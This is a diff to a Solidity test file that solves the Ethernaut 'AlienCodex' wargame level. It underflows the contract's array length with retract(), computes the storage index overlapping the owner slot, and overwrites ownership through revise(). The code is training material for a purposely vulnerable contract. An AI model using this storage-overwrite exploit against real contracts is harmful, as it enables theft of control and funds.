@@ -9,7 +9,7 @@ import "../src/BaseLevel.sol";
 contract AlienCodexTest is DSTest {
     Ethernaut ethernaut;
     address alienCodexFactory;
-    address eoaAddress = address(69);
+    address eoa = address(69);
     Vm private constant vm = Vm(HEVM_ADDRESS);
 
     function setUp() public {
@@ -34,28 +34,36 @@ contract AlienCodexTest is DSTest {
     }
 
     function testIsAlienCodexCleared() public {
-        vm.startPrank(eoaAddress);
+        vm.startPrank(eoa);
 
-        address instanceAddress = ethernaut.createLevelInstance(
+        address instance = ethernaut.createLevelInstance(
             Level(alienCodexFactory)
         );
 
-        instanceAddress.call(abi.encodeWithSignature("make_contact()"));
-        instanceAddress.call(abi.encodeWithSignature("retract()"));
+        (bool makeContactSuccess, ) = instance.call(
+            abi.encodeWithSignature("make_contact()")
+        );
+        require(makeContactSuccess, "make_contact() failed");
+
+        (bool retractSuccess, ) = instance.call(
+            abi.encodeWithSignature("retract()")
+        );
+        require(retractSuccess, "retract() failed");
 
         uint256 ownerIndex = type(uint256).max -
             uint256(keccak256(abi.encode(1))) +
             1;
 
-        instanceAddress.call(
+        (bool reviseSuccess, ) = instance.call(
             abi.encodeWithSignature(
                 "revise(uint256,bytes32)",
                 ownerIndex,
-                bytes32(abi.encode(eoaAddress))
+                bytes32(abi.encode(eoa))
             )
         );
+        require(reviseSuccess, "revise() failed");
 
-        assertTrue(ethernaut.submitLevelInstance(payable(instanceAddress)));
+        assertTrue(ethernaut.submitLevelInstance(payable(instance)));
 
         vm.stopPrank();
     }
